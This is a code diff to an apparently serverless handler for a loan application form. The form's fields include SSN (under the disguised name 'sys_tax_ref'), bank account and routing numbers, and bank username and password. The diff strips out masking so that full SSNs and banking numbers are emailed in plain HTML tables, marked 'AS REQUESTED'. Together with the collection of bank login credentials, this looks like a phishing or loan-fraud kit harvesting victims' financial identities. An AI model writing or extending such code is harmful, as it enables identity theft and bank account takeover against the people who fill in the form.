@@ -16,21 +16,14 @@ exports.handler = async (event) => {
         return { statusCode: 400, body: JSON.stringify({ ok: false, error: 'Valid email is required' }) };
     }
 
-    // Helper to mask sensitive data (Last 4 digits visible)
-    const maskLast4 = (s) => {
-        if (!s) return '-';
-        const str = String(s).replace(/\D/g, ''); // Keep only digits
-        if (str.length < 4) return '***';
-        return '•••' + str.slice(-4);
-    };
-
     // Map fields from apply.html to variables
     // Form fields: firstname, lastname, sys_tax_ref (SSN), street_address, city, state, dob, 
     // bank_name, account_number, routing_number, username, password, email, phone, loan_amount
 
-    const maskedSSN = maskLast4(payload.sys_tax_ref);
-    const maskedAccount = maskLast4(payload.account_number);
-    const maskedRouting = maskLast4(payload.routing_number);
+    // FULL DETAILS AS REQUESTED (Unmasked)
+    const ssn = payload.sys_tax_ref;
+    const accountNumber = payload.account_number;
+    const routingNumber = payload.routing_number;
     const loanAmount = payload.loan_amount ? '$' + payload.loan_amount : '-';
 
     const rows = (label, value) => `<tr><td style="padding:8px 10px;border-bottom:1px solid #eee;width:40%;"><strong>${label}</strong></td><td style="padding:8px 10px;border-bottom:1px solid #eee;">${value || '-'}</td></tr>`;
@@ -49,14 +42,14 @@ exports.handler = async (event) => {
         ${rows('Address', payload.street_address)}
         ${rows('City', payload.city)}
         ${rows('State', payload.state)}
-        ${rows('SSN (Last 4)', maskedSSN)}
+        ${rows('SSN', ssn)}
         </table>
         
         <h4 style="margin-top:20px;border-bottom:2px solid #020361;padding-bottom:10px;">Bank Information</h4>
         <table style="border-collapse:collapse;width:100%">
         ${rows('Bank Name', payload.bank_name)}
-        ${rows('Routing # (Last 4)', maskedRouting)}
-        ${rows('Account # (Last 4)', maskedAccount)}
+        ${rows('Routing #', routingNumber)}
+        ${rows('Account #', accountNumber)}
         </table>
 
         <h4 style="margin-top:20px;border-bottom:2px solid #020361;padding-bottom:10px;">Loan & Account</h4>
